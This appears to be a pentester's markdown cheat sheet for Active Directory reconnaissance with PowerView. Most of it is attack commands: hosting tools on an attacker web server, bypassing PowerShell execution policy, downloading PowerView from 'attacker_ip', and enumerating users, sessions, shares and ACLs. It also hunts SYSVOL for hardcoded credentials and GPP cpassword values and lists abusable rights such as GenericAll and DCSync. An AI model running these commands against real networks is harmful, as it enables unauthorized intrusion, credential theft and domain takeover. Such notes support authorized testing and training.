
# PowerView


```bash
└─$ pwd    
/home/exploits

└─$ python3 -m http.server 80  
```

```cmd
powershell -ep bypass
```

```powershell
iwr -uri http://attacker_ip/enum/PowerView.ps1 -outfile PowerView.ps1

Import-Module .\PowerView.ps1  

# Domain Info
Get-NetDomain
Get-Domain
Get-DomainController

# Users
Get-NetUser  
Get-NetUser | Select-Object cn  
Get-NetUser | Select-Object cn,pwdlastset,lastlogon  

Get-DomainUser
Get-DomainUser | Select-Object samaccountname,description,pwdlastset,lastlogon

# Computers
Get-NetComputer | Select-Object dnshostname,operatingsystem,operatingsystemversion

Get-DomainComputer | Select-Object dnshostname,operatingsystem,operatingsystemversion

# scan network to see if current user has admin perm on computers in domain
Find-LocalAdminAccess  

# find shares in domain  
Find-DomainShare  
# display shares only available to us  
Find-DomainShare -CheckShareAccess  

# use NetWkstauserEnum & NetSessionEnum under the hood 
Get-NetSession -ComputerName computer_name  
Get-NetSession -ComputerName computer_name -Verbose

# retrieve perm for object   
# filter based on identity  
Get-ObjectAcl -Identity alice  
# object defined with -Path flag  
Get-ObjectAcl -Identity "GROUP_NAME"

# ActiveDirectoryRights + SecurityIdentifier  
# e.g. display only values rel to GenericAll    
Get-ObjectAcl -Identity "GROUP_NAME" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights  

Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```

e.g. finding Shares and SYSVOL
```powershell
# find shares in domain  
Find-DomainShare  
# display shares only available to us  
Find-DomainShare -CheckShareAccess  
```

after `PowerView` finds the domain + DC: check `SYSVOL`
```cmd
ls \\DC01.domain.com\sysvol\domain.com

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----                 DATE               Policies
d-----                 DATE               scripts
```  

```powershell
Get-ChildItem \\DC01.domain.com\sysvol\domain.com -Recurse
```

look for: 
- `Policies`
- `scripts`
- `Groups.xml`
- `Services.xml`
- `ScheduledTasks.xml`
- `Drives.xml`
- `.bat`
- `.cmd`
- `.ps1`
- hardcoded creds
- old GPP `cpassword`

e.g. ACL Enumeration
```powershell
# ActiveDirectoryRights + SecurityIdentifier  
# e.g. display only values rel to GenericAll    
Get-ObjectAcl -Identity "GROUP_NAME" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights  

SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1111111111-2222222222-3333333333-512 GenericAll

# resolve SID
Convert-SidToName S-1-5-21-1111111111-2222222222-3333333333-512
```

rights to enumerate 
```text
GenericAll
GenericWrite
WriteDacl
WriteOwner
AddMember
AddSelf
ForceChangePassword
AllExtendedRights
DCSync rights
```

